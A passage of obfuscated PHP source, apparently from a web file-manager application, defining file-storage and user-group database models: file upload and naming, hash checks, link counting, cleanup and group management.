= array(); if (!isset($–šî¾ß[$î¯ÙöŒÃ])) { $’Í¹¨Ä = $»µïÈ€[1855]; $Ñ÷íÛÊä = Model($»µïÈ€[470])->field($’Í¹¨Ä)->where(array($»µïÈ€[468] => $î¯ÙöŒÃ))->find(); $–šî¾ß[$î¯ÙöŒÃ] = $Ñ÷íÛÊä; } return $–šî¾ß[$î¯ÙöŒÃ]; } public function addFileByContent($êÄúı¢± = '', $ø–òü¨Õ = '') { $¶ÆıÍ =& $_SERVER[¥Ÿ©ÒèÌ]; $»ñÄ”ì¦ = TEMP_PATH . $¶ÆıÍ[1856]; if (!is_dir($»ñÄ”ì¦)) { mk_dir($»ñÄ”ì¦); } $‚¦‰ÀŸ­ = $»ñÄ”ì¦ . $¶ÆıÍ[1857] . rand_string(16); file_put_contents($‚¦‰ÀŸ­, $êÄúı¢±); $¼®øƒ•„ = $this->addFile($‚¦‰ÀŸ­, $ø–òü¨Õ, !0); if (file_exists($‚¦‰ÀŸ­)) { @unlink($‚¦‰ÀŸ­); } return $¼®øƒ•„; } public function createFileName($¶˜ôÈ¯ó, $½…îûÄ§ = false, $ß†¯Ü« = false) { $¬óÈ®¸á =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö®¾˜ = IO::init($¬óÈ®¸á[8]); $°şÊÍ§¬ = $this->makeFilePath($¶˜ôÈ¯ó, $Ö®¾˜, $½…îûÄ§, $ß†¯Ü«); $˜Ò•Õ½ = $Ö®¾˜->pathFather($°şÊÍ§¬); static $¥İ²©¹• = false; $ëŞ·©Íæ = $¬óÈ®¸á[1858] . md5($˜Ò•Õ½); if (!$¥İ²©¹• && !Cache::get($ëŞ·©Íæ)) { $¥İ²©¹• = !0; $ò÷¤ùëå = IO::mkdir($˜Ò•Õ½); if (!IO::exist($ò÷¤ùëå . $¬óÈ®¸á[787])) { IO::mkfile($ò÷¤ùëå . $¬óÈ®¸á[787]); } Cache::set($ëŞ·©Íæ, 1, 3600 * 2); } return $°şÊÍ§¬; } public function makeFilePath($œÅÌ€‰Ÿ, $Ê÷å£È, $Í‰â„›¶ = false, $ÔÖÊĞÏ‚ = false) { $’¼Îá·Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $®”ì™× = Model($’¼Îá·Ë[760])->get($’¼Îá·Ë[1859]); $î†ë‡œø = KodIO::defaultIO() . date($’¼Îá·Ë[1860]); $¯ŠÌ’¿ = $î†ë‡œø . rand_string(5) . short_id(100); $œÅÌ€‰Ÿ = str_replace($’¼Îá·Ë[8], $’¼Îá·Ë[11], KodIO::clear($œÅÌ€‰Ÿ)); $¾İ¼ãôâ = $Ê÷å£È->ext($œÅÌ€‰Ÿ); if (!$œÅÌ€‰Ÿ) { $®”ì™× = $’¼Îá·Ë[1861]; } switch ($®”ì™×) { case $’¼Îá·Ë[1862]: $¯ŠÌ’¿ = $¯ŠÌ’¿ . $’¼Îá·Ë[10] . $Ê÷å£È->ext($œÅÌ€‰Ÿ); if ($¾İ¼ãôâ == $’¼Îá·Ë[1800]) { $¯ŠÌ’¿ .= $’¼Îá·Ë[1535]; } break; case $’¼Îá·Ë[1863]: $Òı§µõè = Model($’¼Îá·Ë[760])->get($’¼Îá·Ë[761]); $‘¢¶‹ƒÏ = substr(md5($’¼Îá·Ë[762] . $Òı§µõè . date($’¼Îá·Ë[738])), 0, 8); $¢ÎÑ´ö› = KodIO::defaultDriver(); $î†ë‡œø = $’¼Îá·Ë[1213] . $¢ÎÑ´ö›[$’¼Îá·Ë[401]] . $’¼Îá·Ë[410] . date($’¼Îá·Ë[1864]) . $‘¢¶‹ƒÏ . $’¼Îá·Ë[8]; if ($¾İ¼ãôâ == $’¼Îá·Ë[1800]) { $œÅÌ€‰Ÿ .= $’¼Îá·Ë[1535]; } $ú¤’ŞÑÑ = $’¼Îá·Ë[1865] . $î†ë‡œø . $œÅÌ€‰Ÿ; CacheLock::lock($ú¤’ŞÑÑ); $¯ŠÌ’¿ = $î†ë‡œø . $œÅÌ€‰Ÿ; if (IO::exist($î†ë‡œø . $œÅÌ€‰Ÿ)) { $ÀîÑÂÏÕ = substr($œÅÌ€‰Ÿ, 0, strlen($œÅÌ€‰Ÿ) - strlen($¾İ¼ãôâ)); $’£ñ Çú = $ÔÖÊĞÏ‚ ? substr($ÔÖÊĞÏ‚, 0, 5) : ($Í‰â„›¶ ? substr($Í‰â„›¶, 0, 5) : rand_string(5)); $¯ŠÌ’¿ = $î†ë‡œø . $ÀîÑÂÏÕ . $’£ñ Çú . $’¼Îá·Ë[10] . $¾İ¼ãôâ; } if (IO::isTypeObject($¯ŠÌ’¿) && !IO::isUploadServer($¯ŠÌ’¿)) { if (IO::exist($¯ŠÌ’¿)) { return $¯ŠÌ’¿; } $àÛŠ»ÏŸ = IO::setContent($¯ŠÌ’¿, $’¼Îá·Ë[12]); if (!$àÛŠ»ÏŸ) { show_json($’¼Îá·Ë[1866], !1); } } CacheLock::unlock($ú¤’ŞÑÑ); break; case $’¼Îá·Ë[1861]: break; default: break; } return $¯ŠÌ’¿; } public function addFileByRemote($èìÒéœ«, $Ü‹õğ å, $Ú°ó˜İ = array()) { $åğõŞÓ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!IO::exist($èìÒéœ«)) { return !1; } $´ä‡½ã÷ = $Ú°ó˜İ[$åğõŞÓ[169]] ? $Ú°ó˜İ[$åğõŞÓ[169]] : $åğõŞÓ[12]; $ä×­Å¤ = IO::hashMd5($èìÒéœ«, $´ä‡½ã÷); $ºµ°£ş = KodIO::defaultDriver(); $ó¥°êê— = array($åğõŞÓ[579] => IO::size($èìÒéœ«), $åğõŞÓ[1867] => 1, $åğõŞÓ[421] => $Ü‹õğ å, $åğõŞÓ[798] => $ºµ°£ş[$åğõŞÓ[401]], $åğõŞÓ[422] => $èìÒéœ«, $åğõŞÓ[1868] => $Ú°ó˜İ[$åğõŞÓ[170]] ? $Ú°ó˜İ[$åğõŞÓ[170]] : IO::hashSimple($èìÒéœ«), $åğõŞÓ[1869] => $ä×­Å¤ ? $ä×­Å¤ : $´ä‡½ã÷); if ($İÒîíö› = $this->addFileCheckExist($ó¥°êê—[$åğõŞÓ[170]], $ó¥°êê—[$åğõŞÓ[169]], $ó¥°êê—[$åğõŞÓ[80]])) { return $İÒîíö›; } return $this->addFileData($ó¥°êê—); } private function addFileData($‡¨•¥ã½) { $¹”ÙÉ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$‡¨•¥ã½) { return !1; } $‡¨•¥ã½[$¹”ÙÉ¾[80]] = intval($‡¨•¥ã½[$¹”ÙÉ¾[80]]); if (!$‡¨•¥ã½[$¹”ÙÉ¾[80]] && strlen($‡¨•¥ã½[$¹”ÙÉ¾[170]]) > 32) { $‡¨•¥ã½[$¹”ÙÉ¾[80]] = intval(substr($‡¨•¥ã½[$¹”ÙÉ¾[170]], 32)); } $ëâÁ¯°’ = $this->add($‡¨•¥ã½); return $this->find($ëâÁ¯°’); } public function addFile($ôŸğÆò™, $òÃù…‚«, $òİ„”İ¤ = false) { $×óì¿Éœ =& $_SERVER[¥Ÿ©ÒèÌ]; $“’¥©„ = IO::hashSimple($ôŸğÆò™); $ÌËç·¨“ = IO::size($ôŸğÆò™); $„èÂÓ‘ = $ÌËç·¨“ <= 1024 * 1024 * 10 ? IO::hashMd5($ôŸğÆò™) : $×óì¿Éœ[12]; $‰§ ¼Ü = $×óì¿Éœ[1870] . $“’¥©„; CacheLock::lock($‰§ ¼Ü); if ($„èÂÓ‘ && $“’¥©„) { $¦×Š‘ãŒ = $this->addFileCheckExist($“’¥©„, $„èÂÓ‘, $ÌËç·¨“); if ($¦×Š‘ãŒ) { CacheLock::unlock($‰§ ¼Ü); return $¦×Š‘ãŒ; } } $®úñì¼¿ = $this->addFileMake($ôŸğÆò™, $ÌËç·¨“, $“’¥©„, $„èÂÓ‘, $òÃù…‚«, $òİ„”İ¤); $ÂçØêëø = $this->addFileData($®úñì¼¿); CacheLock::unlock($‰§ ¼Ü); if (!$„èÂÓ‘ && $ÂçØêëø) { $this->fileMd5Check($ÂçØêëø); } return $ÂçØêëø; } private function fileMd5Check($â¬¶¤·ë) { $ã³Æ§ŞÄ =& $_SERVER[¥Ÿ©ÒèÌ]; $ñİü—Şò = array($â¬¶¤·ë[$ã³Æ§ŞÄ[467]], $â¬¶¤·ë[$ã³Æ§ŞÄ[78]]); $—°øæñŸ = $ã³Æ§ŞÄ[1871] . $â¬¶¤·ë[$ã³Æ§ŞÄ[78]]; $ÔÉıñµö = $ã³Æ§ŞÄ[1872] . $â¬¶¤·ë[$ã³Æ§ŞÄ[467]]; $÷Ó°ùç¥ = TaskQueue::add($ã³Æ§ŞÄ[1873], $ñİü—Şò, $—°øæñŸ, $ÔÉıñµö); if (!$÷Ó°ùç¥) { $this->fileMd5Set($â¬¶¤·ë[$ã³Æ§ŞÄ[467]], $â¬¶¤·ë[$ã³Æ§ŞÄ[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¤¤£´÷¹, $€¸¸Ô–Æ) { $Íû£É™š =& $_SERVER[¥Ÿ©ÒèÌ]; $£³ÛÖİı = $this->find($¤¤£´÷¹); if (!$£³ÛÖİı || $£³ÛÖİı[$Íû£É™š[169]]) { return; } $áÛ¬âæÑ = IO::hashMd5($€¸¸Ô–Æ); if (!$áÛ¬âæÑ) { return $Íû£É™š[12]; } $this->where(array($Íû£É™š[467] => $¤¤£´÷¹))->save(array($Íû£É™š[169] => $áÛ¬âæÑ)); } public function addFileMake($‡ØÔĞ« , $µüöìï, $¸„‚ £Õ, $ø“Ğğ¤‘, $øì›Û¨ß, $ğÙéÉ›Ê) { $¥¦úï£ß =& $_SERVER[¥Ÿ©ÒèÌ]; $—‡¯’­ = $this->createFileName($øì›Û¨ß, $¸„‚ £Õ, $ø“Ğğ¤‘); $Ï·Úƒ = get_path_father($—‡¯’­); $¤âö‰ı³ = get_path_this($—‡¯’­); if ($ğÙéÉ›Ê) { $š”»°Ê = IO::move($‡ØÔĞ« , $Ï·Úƒ, !1, $¤âö‰ı³); } else { $š”»°Ê = IO::copy($‡ØÔĞ« , $Ï·Úƒ, !1, $¤âö‰ı³); } if (!$š”»°Ê) { return !1; } $ÓÈ—• = KodIO::defaultDriver(); $ğ¿Ø‘®¨ = array($¥¦úï£ß[579] => $µüöìï, $¥¦úï£ß[1867] => 1, $¥¦úï£ß[421] => $øì›Û¨ß, $¥¦úï£ß[798] => $ÓÈ—•[$¥¦úï£ß[401]], $¥¦úï£ß[422] => $—‡¯’­, $¥¦úï£ß[1868] => $¸„‚ £Õ, $¥¦úï£ß[1869] => $ø“Ğğ¤‘); return $ğ¿Ø‘®¨; } public function addFileCheckExist($ü¿£°ßõ, $áÃÜÙ’ù, $îæœğ¾Ï) { $ˆ°ß¡« =& $_SERVER[¥Ÿ©ÒèÌ]; $é€×Å¿“ = $this->findByHash($ü¿£°ßõ, $áÃÜÙ’ù); if (!$é€×Å¿“) { return !1; } $ĞçÁĞÓ— = array($ˆ°ß¡«[1867] => intval($é€×Å¿“[$ˆ°ß¡«[1874]]) + 1, $ˆ°ß¡«[579] => $îæœğ¾Ï); $this->where(array($ˆ°ß¡«[468] => $é€×Å¿“[$ˆ°ß¡«[467]]))->save($ĞçÁĞÓ—); return $é€×Å¿“; } public function remove($°ò·£Õ¿) { $this->linkCountChange($°ò·£Õ¿, !1); $this->clearEmpty(); return !0; } public function linkAdd($ğŒå–ù) { $this->linkCountChange($ğŒå–ù, !0); } public function linkCountChange($ø©úË¦ , $Ù¿ºÂœÒ) { $‚ÉÂİ¹Ú =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ø©úË¦ ) { return; } if (!is_array($ø©úË¦ )) { $ø©úË¦  = array($ø©úË¦ ); } $íÌû¦¥ = array(); foreach ($ø©úË¦  as $™–Ş«) { $Ú—ÆÍ‚© = $™–Ş« . $‚ÉÂİ¹Ú[12]; if (!$íÌû¦¥[$Ú—ÆÍ‚©]) { $íÌû¦¥[$Ú—ÆÍ‚©] = 0; } $íÌû¦¥[$Ú—ÆÍ‚©]++; } $ŞÅÀşÏğ = array(); foreach ($íÌû¦¥ as $™–Ş« => $¿‚¯¶¶‹) { $Ú—ÆÍ‚© = $¿‚¯¶¶‹ . $‚ÉÂİ¹Ú[12]; if (!$ŞÅÀşÏğ[$Ú—ÆÍ‚©]) { $ŞÅÀşÏğ[$Ú—ÆÍ‚©] = array(); } $ŞÅÀşÏğ[$Ú—ÆÍ‚©][] = $™–Ş«; } foreach ($ŞÅÀşÏğ as $¿‚¯¶¶‹ => $Œ°ï‡œ) { if (!$Œ°ï‡œ) { continue; } $¿‚¯¶¶‹ = $Ù¿ºÂœÒ ? $¿‚¯¶¶‹ : -intval($¿‚¯¶¶‹); $åùóÃ®û = array($‚ÉÂİ¹Ú[467] => array($‚ÉÂİ¹Ú[7], $Œ°ï‡œ)); if ($¿‚¯¶¶‹ < 0) { $åùóÃ®û[$‚ÉÂİ¹Ú[1874]] = array($‚ÉÂİ¹Ú[1001], abs($¿‚¯¶¶‹)); } $this->where($åùóÃ®û)->setAdd($‚ÉÂİ¹Ú[1874], $¿‚¯¶¶‹); } } public function findByHash($ÁƒÀªĞ„, $ÔØ»ãó = false) { $”È¶Íœ† =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ÁƒÀªĞ„ && !$ÔØ»ãó) { return !1; } $ìì§É = array($”È¶Íœ†[1868] => $ÁƒÀªĞ„); if ($ÔØ»ãó) { $ìì§É = array($”È¶Íœ†[1869] => $ÔØ»ãó); } return $this->order($”È¶Íœ†[1875])->where($ìì§É)->find(); } public function clearEmpty($óœ‚¹á´ = 0) { $Ì÷’Àè =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÒï® = time() - 3600 * 24 * $óœ‚¹á´; $ËêÄ•á† = $Ì÷’Àè[1876] . $ŒÒï®; $•Æôîáù = $this->where($ËêÄ•á†)->select(); if (!$•Æôîáù) { return; } $ü¶Ö÷”× = new Task($Ì÷’Àè[1877], $Ì÷’Àè[12], count($•Æôîáù)); foreach ($•Æôîáù as $Ú«ÈøÆÍ) { $ü¶Ö÷”×->update(1); $this->resetFile($Ú«ÈøÆÍ); } $ü¶Ö÷”×->end(); } public function resetFile($°Ù©š¹œ) { $„Êš‹¶ı =& $_SERVER[¥Ÿ©ÒèÌ]; $ƒ³ÇÔ¾¬ = array($„Êš‹¶ı[468] => $°Ù©š¹œ[$„Êš‹¶ı[467]]); $ØŸàëÀ˜ = Model($„Êš‹¶ı[1311])->where($ƒ³ÇÔ¾¬)->count(); $”ßÚ¥ÌÃ = Model($„Êš‹¶ı[1878])->where($ƒ³ÇÔ¾¬)->count(); $ãÜ“ø¤‹ = intval($ØŸàëÀ˜) + intval($”ßÚ¥ÌÃ); if ($ãÜ“ø¤‹ == 0) { IO::remove($°Ù©š¹œ[$„Êš‹¶ı[78]]); Model($„Êš‹¶ı[1879])->delete($°Ù©š¹œ[$„Êš‹¶ı[467]]); $this->where($ƒ³ÇÔ¾¬)->delete(); $this->metaSet($°Ù©š¹œ[$„Êš‹¶ı[467]], null, null); return; } if ($°Ù©š¹œ[$„Êš‹¶ı[1874]] != $ãÜ“ø¤‹) { $this->where($ƒ³ÇÔ¾¬)->save(array($„Êš‹¶ı[1867] => $ãÜ“ø¤‹)); } } public function storageInfo($î©‹†„§ = false) { $¢«Ø‡× =& $_SERVER[¥Ÿ©ÒèÌ]; $½ŞÓ‘Ô = $this->count() + 0.0; $ì¶Ş ‡ö = 0; $á™¨Å = 1; $ĞúöéÃ† = 0; $èœ˜ñ = 5000; for ($«ßó·£ = 0; $«ßó·£ < $½ŞÓ‘Ô; $«ßó·£ = $«ßó·£ + $èœ˜ñ) { $’èŠäÕ = $this->limit($«ßó·£, $«ßó·£ + $èœ˜ñ)->select(); foreach ($’èŠäÕ as $Èôñ¢¬—) { $á™¨Å += $Èôñ¢¬—[$¢«Ø‡×[80]] * $Èôñ¢¬—[$¢«Ø‡×[1874]]; $ì¶Ş ‡ö += $Èôñ¢¬—[$¢«Ø‡×[80]] * ($Èôñ¢¬—[$¢«Ø‡×[1874]] - 1); $ĞúöéÃ† += $Èôñ¢¬—[$¢«Ø‡×[1874]]; } } $öÖ¤¯›³ = array($¢«Ø‡×[1880] => $á™¨Å, $¢«Ø‡×[1881] => $ì¶Ş ‡ö, $¢«Ø‡×[1882] => $ì¶Ş ‡ö / $á™¨Å, $¢«Ø‡×[84] => $½ŞÓ‘Ô, $¢«Ø‡×[1883] => $ĞúöéÃ†); return $öÖ¤¯›³; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\x65" => "\x67\162\157\165\160\x5f\x6d\x65\164\141", "\155\145\164\141\x46\151\145\x6c\144" => "\x67\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($âŠ»Ëò‹) { $ŞÊñˆú =& $_SERVER[¥Ÿ©ÒèÌ]; return array($ŞÊñˆú[1884] => array($âŠ»Ëò‹[0], $ŞÊñˆú[1885]), $ŞÊñˆú[1886] => array($âŠ»Ëò‹[0], $ŞÊñˆú[1887])); } protected function getInfo($÷ÌŞ‚ÏŒ, $ÖÈ’å·– = false) { $¯²“´ç³ = $this->getInfoSimple($÷ÌŞ‚ÏŒ); if (!$¯²“´ç³) { return !1; } if ($ÖÈ’å·–) { return $this->_listDataApplyItem($¯²“´ç³); } return $this->cacheFunctionGet($_SERVER[¥Ÿ©ÒèÌ][1888], $÷ÌŞ‚ÏŒ); } protected function getInfoSimple($ıº—, $€ÎÊ¯ñ­ = false) { $ò†…Ì¡ğ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($€ÎÊ¯ñ­) { $æ›—éç• = array($ò†…Ì¡ğ[1807] => intval($ıº—)); $æ¤û÷Ùö = $this->where($æ›—éç•)->find(); return is_array($æ¤û÷Ùö) ? $æ¤û÷Ùö : array(); } return $this->cacheFunctionGet($ò†…Ì¡ğ[1889], $ıº—); } protected function groupAdd($´ß½) { $¤´È˜¾Ó =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$´ß½[$¤´È˜¾Ó[498]] && isset($´ß½[$¤´È˜¾Ó[1807]]) && $´ß½[$¤´È˜¾Ó[1807]] == 1) { if ($×Ğú€ÓŒ = $this->getInfoSimple($´ß½[$¤´È˜¾Ó[1807]], !0)) { return $´ß½[$¤´È˜¾Ó[1807]]; } } else { $×Ğú€ÓŒ = $this->getInfoSimple($´ß½[$¤´È˜¾Ó[498]]); if (!$×Ğú€ÓŒ) { return !1; } } $’ÔÉ¨½Œ = $¤´È˜¾Ó[531]; if ($×Ğú€ÓŒ[$¤´È˜¾Ó[521]]) { $’ÔÉ¨½Œ = $×Ğú€ÓŒ[$¤´È˜¾Ó[521]] . $×Ğú€ÓŒ[$¤´È˜¾Ó[1807]] . $¤´È˜¾Ó[50]; } $³–øŒ¼Æ = array($¤´È˜¾Ó[421] => $this->groupNameAuto($´ß½[$¤´È˜¾Ó[498]], $´ß½[$¤´È˜¾Ó[32]]), $¤´È˜¾Ó[402] => $´ß½[$¤´È˜¾Ó[498]], $¤´È˜¾Ó[584] => $’ÔÉ¨½Œ, $¤´È˜¾Ó[1890] => $´ß½[$¤´È˜¾Ó[1794]], $¤´È˜¾Ó[1891] => 0, $¤´È˜¾Ó[1811] => 0); if (isset($´ß½[$¤´È˜¾Ó[1830]])) { $³–øŒ¼Æ[$¤´È˜¾Ó[1830]] = $´ß½[$¤´È˜¾Ó[1830]]; } else { $¥ªªÏÂ¼ = $this->max($¤´È˜¾Ó[1830]); if (!$¥ªªÏÂ¼) { $¥ªªÏÂ¼ = 0; } $³–øŒ¼Æ[$¤´È˜¾Ó[1830]] = $¥ªªÏÂ¼ + 1; } if (!empty($´ß½[$¤´È˜¾Ó[1807]])) { $³–øŒ¼Æ[$¤´È˜¾Ó[1807]] = $´ß½[$¤´È˜¾Ó[1807]]; } $÷ı½Œ½ = $this->add($³–øŒ¼Æ); $this->setNamePinyin($÷ı½Œ½, $³–øŒ¼Æ[$¤´È˜¾Ó[32]]); if (isset($´ß½[$¤´È˜¾Ó[1892]])) { $this->metaSet($÷ı½Œ½, array($¤´È˜¾Ó[1892] => $´ß½[$¤´È˜¾Ó[1892]], $¤´È˜¾Ó[1893] => $´ß½[$¤´È˜¾Ó[1893]])); unset($´ß½[$¤´È˜¾Ó[1892]]); unset($´ß½[$¤´È˜¾Ó[1893]]); } Model($¤´È˜¾Ó[1311])->groupRootAdd($÷ı½Œ½); return $÷ı½Œ½; } protected function groupEdit($–ßÓ¬–µ, $éÒöêÎâ) { $åçƒ¼€¶ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÄµáÁÃœ = $this->getInfoSimple($–ßÓ¬–µ); if (!$ÄµáÁÃœ) { return !1; } if (!empty($éÒöêÎâ[$åçƒ¼€¶[498]])) { $–ÕÖºéå = $this->getInfoSimple($éÒöêÎâ[$åçƒ¼€¶[498]]); if (!$–ÕÖºéå) { return !1; } if ($ÄµáÁÃœ[$åçƒ¼€¶[1807]] == $–ÕÖºéå[$åçƒ¼€¶[1807]]) { return !1; } if ($éÒöêÎâ[$åçƒ¼€¶[498]] != $ÄµáÁÃœ[$åçƒ¼€¶[498]]) { if ($–ÕÖºéå[$åçƒ¼€¶[521]] !== $ÄµáÁÃœ[$åçƒ¼€¶[521]] && strpos($–ÕÖºéå[$åçƒ¼€¶[521]], $ÄµáÁÃœ[$åçƒ¼€¶[521]] . $ÄµáÁÃœ[$åçƒ¼€¶[1807]] . $åçƒ¼€¶[50]) === 0) { return !1; } $éÒöêÎâ[$åçƒ¼€¶[584]] = $–ÕÖºéå[$åçƒ¼€¶[521]] . $éÒöêÎâ[$åçƒ¼€¶[498]] . $åçƒ¼€¶[50]; $this->_changeChildLevel($ÄµáÁÃœ, $–ÕÖºéå); } } if (isset($éÒöêÎâ[$åçƒ¼€¶[32]])) { $this->setNamePinyin($–ßÓ¬–µ, $éÒöêÎâ[$åçƒ¼€¶[32]]); } if (isset($éÒöêÎâ[$åçƒ¼€¶[1892]])) { $this->metaSet($–ßÓ¬–µ, array($åçƒ¼€¶[1892] => $éÒöêÎâ[$åçƒ¼€¶[1892]], $åçƒ¼€¶[1893] => $éÒöêÎâ[$åçƒ¼€¶[1893]])); unset($éÒöêÎâ[$åçƒ¼€¶[1892]]); unset($éÒöêÎâ[$åçƒ¼€¶[1893]]); } $this->_clearChildrenCache($ÄµáÁÃœ); return $this->where(array($åçƒ¼€¶[1894] => $–ßÓ¬–µ))->save($éÒöêÎâ); } private function _clearChildrenCache($ÙŒ×ÕÔ) { $Ö¢¬òıÛ =& $_SERVER[¥Ÿ©ÒèÌ]; $‡­¯éÈ = array($Ö¢¬òıÛ[584] => array($Ö¢¬òıÛ[544], $ÙŒ×ÕÔ[$Ö¢¬òıÛ[521]] . $ÙŒ×ÕÔ[$Ö¢¬òıÛ[1807]] . $Ö¢¬òıÛ[545])); $‹Şìù… = $this->field($Ö¢¬òıÛ[1807])->where($‡­¯éÈ)->select(); foreach ($‹Şìù… as $¢¥ˆ³íµ) { $this->_clearCache($¢¥ˆ³íµ[$Ö¢¬òıÛ[1807]]); } } private function _clearCache($À’Œ•¨û) { $™Ó°øÌ” =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cacheFunctionClear($™Ó°øÌ”[1888], $À’Œ•¨û); $this->cacheFunctionClear($™Ó°øÌ”[1889], $À’Œ•¨û); } private function _changeChildLevel($¸†ŞßÜş, $İŸ”õª—, $ÄúÈØç = false) { $Üôğ¸£Ú =& $_SERVER[¥Ÿ©ÒèÌ]; $¶£ô²š¸ = $¸†ŞßÜş[$Üôğ¸£Ú[521]] . $¸†ŞßÜş[$Üôğ¸£Ú[1807]] . $Üôğ¸£Ú[50]; $ÄË¼·šÆ = $İŸ”õª—[$Üôğ¸£Ú[521]] . $İŸ”õª—[$Üôğ¸£Ú[1807]] . $Üôğ¸£Ú[50] . $¸†ŞßÜş[$Üôğ¸£Ú[1807]] . $Üôğ¸£Ú[50]; if ($ÄúÈØç) { $ÄË¼·šÆ = $İŸ”õª—[$Üôğ¸£Ú[521]] . $İŸ”õª—[$Üôğ¸£Ú[1807]] . $Üôğ¸£Ú[50]; } $ÉæÅóçÆ = array($Üôğ¸£Ú[584] => array($Üôğ¸£Ú[544], $¸†ŞßÜş[$Üôğ¸£Ú[521]] . $¸†ŞßÜş[$Üôğ¸£Ú[1807]] . $Üôğ¸£Ú[545])); $‹ä™ïåİ = array($Üôğ¸£Ú[584] => array($Üôğ¸£Ú[593], "\x72\x65\x70\154\141\x63\x65\50\x70\x61\x72\x65\x6e\x74\114\x65\x76\x65\x6c\54\x27{$¶£ô²š¸}\47\x2c\47{$ÄË¼·šÆ}\47\51")); $this->_clearChildrenCache($¸†ŞßÜş); $this->where($ÉæÅóçÆ)->data($‹ä™ïåİ)->save(); } public function setNamePinyin($£¡š, $ªšª˜¯˜ = false) { $«Š†˜¤º =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ªšª˜¯˜) { $óÌì—ğì = $this->getInfoSimple($£¡š); $ªšª˜¯˜ = $óÌì—ğì[$«Š†˜¤º[32]]; } if (!Input::check($ªšª˜¯˜, $«Š†˜¤º[587])) { $this->metaSet($£¡š, $«Š†˜¤º[464], null); $this->metaSet($£¡š, $«Š†˜¤º[463], null); return; } $Ã£Îñ÷¿ = array($«Š†˜¤º[464] => str_replace($«Š†˜¤º[53], $«Š†˜¤º[12], Pinyin::get($ªšª˜¯˜)), $«Š†˜¤º[463] => Pinyin::get($ªšª˜¯˜, $«Š†˜¤º[588])); $this->metaSet($£¡š, $Ã£Îñ÷¿); } protected function groupStatus($ø“ï‡€Ü, $‘«º‚Ÿ¿) { $ìïè¢Ò€ =& $_SERVER[¥Ÿ©ÒèÌ]; $£‘øÑĞ˜ = $this->getInfoSimple($ø“ï‡€Ü); if (!$£‘øÑĞ˜) { return !1; } if ($‘«º‚Ÿ¿ == $ìïè¢Ò€[89]) { $¶‘Üºùâ = $this->parentLevelArray($£‘øÑĞ˜[$ìïè¢Ò€[521]]); } else { $–¾ë­ã = array($ìïè¢Ò€[584] => array($ìïè¢Ò€[544], $£‘øÑĞ˜[$ìïè¢Ò€[521]] . $£‘øÑĞ˜[$ìïè¢Ò€[1807]] . $ìïè¢Ò€[545])); $¶‘Üºùâ = $this->where($–¾ë­ã)->field($ìïè¢Ò€[1807])->select(); $¶‘Üºùâ = array_to_keyvalue($¶‘Üºùâ, $ìïè¢Ò€[12], $ìïè¢Ò€[1807]); } $¶‘Üºùâ[] = $£‘øÑĞ˜[$ìïè¢Ò€[1807]]; $ñâ¸¯¼ş = array(); foreach ($¶‘Üºùâ as $ø“ï‡€Ü) { $ñâ¸¯¼ş[] = array($ìïè¢Ò€[1807] => $ø“ï‡€Ü, $ìïè¢Ò€[95] => $ìïè¢Ò€[740], $ìïè¢Ò€[378] => $‘«º‚Ÿ¿); $this->_clearCache($ø“ï‡€Ü); } return Model($ìïè¢Ò€[1895])->addAll($ñâ¸¯¼ş, array(), !0); } protected function groupRemove($½ŞÑé§²) { $œÔü› =& $_SERVER[¥Ÿ©ÒèÌ]; $—¦í÷ÑÙ = array($œÔü›[1807] => $½ŞÑé§²); $øÃÊèíŠ = $this->where($—¦í÷ÑÙ)->find(); if (!$øÃÊèíŠ || $øÃÊèíŠ[$œÔü›[498]] == 0) { return !1; } $¾ÌöÏ”ò = $this->getInfoSimple($øÃÊèíŠ[$œÔü›[498]]); $this->_changeChildLevel($øÃÊèíŠ, $¾ÌöÏ”ò, !0); $this->where(array($œÔü›[498] => $½ŞÑé§²))->save(array($œÔü›[498] => $øÃÊèíŠ[$œÔü›[498]])); Model($œÔü›[1895])->where($—¦í÷ÑÙ)->delete(); Model($œÔü›[1896])->where($—¦í÷ÑÙ)->delete(); Model($œÔü›[815])->groupRootRemove($½ŞÑé§²); return $this->where($—¦í÷ÑÙ)->delete(); } protected function groupSort($Ñı°®—Û) { $ €Å÷¨û =& $_SERVER[¥Ÿ©ÒèÌ]; $îŞÕğ‰— = array(); foreach ($Ñı°®—Û as $ø§Ğ§Â¾ => $ôÈªÅ…Ø) { $îŞÕğ‰—[] = array($ €Å÷¨û[1807], $ôÈªÅ…Ø, $ €Å÷¨û[1830], $ø§Ğ§Â¾ + 1); } $this->saveAll($îŞÕğ‰—); } public function listData() { $ªı¾ğÉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ªı¾ğÉ[$_SERVER[¥Ÿ©ÒèÌ][373]]); return $ªı¾ğÉ; } private function _makeOrder($Úü½¼®› = '') { $Æ†ş²¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $é¢óÇÔ„ = array($Æ†ş²¾[1807], $Æ†ş²¾[32], $Æ†ş²¾[1796], $Æ†ş²¾[193]); $½¨¸à„· = array($Æ†ş²¾[448] => $Æ†ş²¾[449], $Æ†ş²¾[450] => $Æ†ş²¾[451]); $ˆüàÍÈ¾ = Input::get($Æ†ş²¾[455], $Æ†ş²¾[7], $Æ†ş²¾[1811], $é¢óÇÔ„); $€ü²Íï = Input::get($Æ†ş²¾[456], $Æ†ş²¾[7], $Æ†ş²¾[1897], array($Æ†ş²¾[1897], $Æ†ş²¾[450])); $€ü²Íï = $½¨¸à„·[$€ü²Íï]; $Úü½¼®› = $Úü½¼®› . "{$ˆüàÍÈ¾}\x20{$€ü²Íï}\54\x20\147\162\x6f\x75\160\111\104\x20\x61\163\x63"; return $this->order($Úü½¼®›); } public function listChild($Ü¦şµŞ) { $Ü÷©Ùº =& $_SERVER[¥Ÿ©ÒèÌ]; $øñÒ¶•« = $this->where(array($Ü÷©Ùº[498] => 